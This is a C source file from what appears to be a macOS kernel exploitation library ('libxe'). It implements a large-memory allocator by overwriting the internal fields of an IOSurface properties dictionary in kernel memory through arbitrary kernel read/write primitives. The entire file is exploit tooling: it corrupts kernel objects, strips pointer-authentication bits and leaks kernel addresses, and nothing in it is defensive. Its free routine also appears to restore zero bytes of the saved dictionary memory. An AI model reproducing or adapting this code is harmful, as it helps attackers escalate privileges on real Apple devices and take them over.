//
//  large_mem.c
//  libxe
//
//  Created by admin on 2/15/22.
//

#include <stdlib.h>
#include <stdatomic.h>

#include <IOKit/IOKitLib.h>
#include <IOSurface/IOSurface.h>

#include "allocator/large_mem.h"
#include <macos/kernel.h>
#include "memory/kmem.h"
#include "iokit/io_surface.h"
#include "util/assert.h"
#include "util/ptrauth.h"


struct xe_allocator_large_mem {
    IOSurfaceRef surface;
    uintptr_t    dict;
    char*        dict_memory_backup;
    uint32_t     dict_count;
};

xe_allocator_large_mem_t xe_allocator_large_mem_allocate(size_t size, uintptr_t* addr_out) {
    uintptr_t surface_addr;
    IOSurfaceRef surface = xe_io_surface_create(&surface_addr);
    
    uintptr_t props_dict = xe_kmem_read_uint64(surface_addr, TYPE_IOSURFACE_MEM_PROPS_OFFSET);
    size_t expected_capacity = (size + 15) / 16;
    xe_assert_cond(expected_capacity, <=, UINT32_MAX);
    xe_kmem_write_uint32(props_dict, TYPE_OS_DICTIONARY_MEM_CAPACITY_INCREMENT_OFFSET, (uint32_t)expected_capacity);
    
    uint32_t capacity = xe_kmem_read_uint32(props_dict, TYPE_OS_DICTIONARY_MEM_CAPACITY_OFFSET);
    uint32_t count = xe_kmem_read_uint32(props_dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET);
    xe_assert_cond(capacity, >=, count);
    
    for (int i=0; i<(capacity - count + 1); i++) {
        char key[NAME_MAX];
        snprintf(key, sizeof(key), "key_%d", i);
        CFStringRef cf_key = CFStringCreateWithCString(kCFAllocatorDefault, key, kCFStringEncodingUTF8);
        IOSurfaceSetValue(surface, cf_key, kCFBooleanTrue);
        CFRelease(cf_key);
    }
    
    uint32_t new_capacity = xe_kmem_read_uint32(props_dict, TYPE_OS_DICTIONARY_MEM_CAPACITY_OFFSET);
    xe_assert_cond(new_capacity, ==, expected_capacity);
    uintptr_t dict_memory = xe_ptrauth_strip(xe_kmem_read_uint64(props_dict, TYPE_OS_DICTIONARY_MEM_DICTIONARY_OFFSET));
    uint32_t new_count = xe_kmem_read_uint32(props_dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET);
    
    xe_kmem_write_uint32(props_dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET, 0);
    
    char* dict_memory_backup = malloc(new_count * 16);
    xe_kmem_read(dict_memory_backup, dict_memory, 0, new_count * 16);
    
    xe_allocator_large_mem_t allocator = malloc(sizeof(struct xe_allocator_large_mem));
    allocator->surface = surface;
    allocator->dict = props_dict;
    allocator->dict_count = new_count;
    allocator->dict_memory_backup = dict_memory_backup;
    *addr_out = dict_memory;
    
    return allocator;
}

uintptr_t xe_allocator_large_mem_allocate_disowned(size_t size) {
    uintptr_t addr;
    xe_allocator_large_mem_t allocator = xe_allocator_large_mem_allocate(size, &addr);
    xe_kmem_write_uint32(allocator->dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET, 0);
    xe_kmem_write_uint32(allocator->dict, TYPE_OS_DICTIONARY_MEM_CAPACITY_OFFSET, 0);
    xe_kmem_write_uint64(allocator->dict, TYPE_OS_DICTIONARY_MEM_DICTIONARY_OFFSET, 0);
    IOSurfaceRemoveAllValues(allocator->surface);
    IOSurfaceDecrementUseCount(allocator->surface);
    free(allocator->dict_memory_backup);
    free(allocator);
    return addr;
}

void xe_allocator_large_mem_free(xe_allocator_large_mem_t* allocator_p) {
    xe_allocator_large_mem_t allocator = *allocator_p;
    uint32_t current_count = xe_kmem_read_uint32(allocator->dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET);
    xe_assert_cond(current_count, ==, 0);
    xe_kmem_write(xe_ptrauth_strip(xe_kmem_read_uint64(allocator->dict, TYPE_OS_DICTIONARY_MEM_DICTIONARY_OFFSET)), 0, allocator->dict_memory_backup, current_count * 16);
    xe_kmem_write_uint32(allocator->dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET, allocator->dict_count);
    IOSurfaceRemoveAllValues(allocator->surface);
    IOSurfaceDecrementUseCount(allocator->surface);
    free(allocator->dict_memory_backup);
    free(allocator);
    *allocator_p = NULL;
}
